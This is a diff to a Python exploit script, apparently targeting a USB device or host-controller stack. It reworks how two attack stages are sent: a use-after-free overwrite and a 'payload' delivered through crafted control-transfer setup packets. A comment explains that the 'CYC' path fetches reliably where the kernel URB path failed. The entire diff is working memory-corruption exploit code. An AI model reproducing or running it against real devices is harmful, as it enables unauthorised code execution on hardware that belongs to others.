@@ -127,21 +127,20 @@ def main():
             print('[ring] dump failed: %r' % (e,))
         return 1
 
-    usb.claim(handle)
-
-    # ---- B2: THE UAF WRITE (overhang wLength=0x40, 128 bytes) ---------
+    # ---- B2 + B3: THE WRITES, via CYC OUT cycles (the proven-fetch path) --
+    # The kernel URB path is dead post-Set-TR-Deq (the chip ignores kernel
+    # TDs: actual=0 twice, Nov 14 00:04-00:05). CYC pushes fetch reliably.
     data = b'\xCC' * 0x40 + overwrite
-    rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0x0000, 0x0000, 0x40,
-                            data=data, abandon=True, cancel_at=0x80,
-                            timeout_ms=3000, name='uaf-write')
-    print('[stage3] UAF write: rc=%s info=%r' % (rc, info))
+    write_setup = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00])
+    rc = cyc(write_setup, data)
+    print('[stage3] UAF write CYC: rc=%d' % rc)
+    time.sleep(0.3)
 
-    # ---- B3: THE PAYLOAD (wLength=0x2C0, 768 bytes) -------------------
     data = b'\xCC' * 0x40 + payload
-    rc, info = usb.raw_ctrl(handle, 0x21, 0x01, 0x0000, 0x0000, 0x2C0,
-                            data=data, abandon=True, cancel_at=0x300,
-                            timeout_ms=4000, name='payload')
-    print('[stage3] payload: rc=%s info=%r' % (rc, info))
+    pay_setup = bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02])
+    rc = cyc(pay_setup, data)
+    print('[stage3] payload CYC: rc=%d' % rc)
+    time.sleep(0.5)
 
     # ---- verdict -------------------------------------------------------
     P.reset_and_release(usb, handle, settle=2.0)
